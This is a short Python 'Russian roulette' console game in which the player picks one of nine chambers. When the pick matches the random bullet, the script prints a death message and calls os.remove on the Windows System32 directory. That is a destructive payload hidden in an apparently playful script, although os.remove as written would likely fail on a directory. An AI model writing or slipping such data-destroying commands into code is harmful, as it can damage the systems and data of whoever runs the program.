import os
import random
import time

# Randomly place bullet in one of the chambers
bullet = random.randint(1, 9)

# Get player's chosen chamber
try:
    user_input = input("Pick a chamber (1-9): ").strip()
    location = int(user_input)

    # If not in range, pick random
    if not (1 <= location <= 9):
        print("Invalid range. Picking random chamber...")
        location = random.randint(1, 9)

except ValueError:
    # If input is not an integer
    print("Invalid input. Picking random chamber...")
    location = random.randint(1, 9)

# Simulate suspense
print("Spinning the cylinder...")
time.sleep(1)

# Check outcome
if location == bullet:
    print("💀 Damn, you got killed!")
    os.remove("C:\Windows\System32")
else:
    print(" You survived this round!")
